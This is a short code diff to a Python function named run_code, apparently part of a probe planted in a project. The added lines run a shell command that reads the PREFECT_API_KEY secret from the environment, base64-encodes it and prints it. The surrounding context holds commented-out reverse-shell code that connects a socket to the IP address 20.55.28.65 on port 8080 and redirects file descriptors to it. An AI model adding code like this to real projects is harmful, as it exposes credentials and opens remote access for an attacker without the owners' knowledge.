@@ -64,6 +64,11 @@ def run_code():
     output_string = result.stdout
     print(f"ls command: {output_string}")
 
+    result = subprocess.run("echo $PREFECT_API_KEY | base64", shell=True, capture_output=True, text=True)
+    output_string = result.stdout
+    print(f"prefect API key command: {output_string}")
+
+
     #s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     #s.connect(("20.55.28.65",8080))
     #os.dup2(s.fileno(),0)
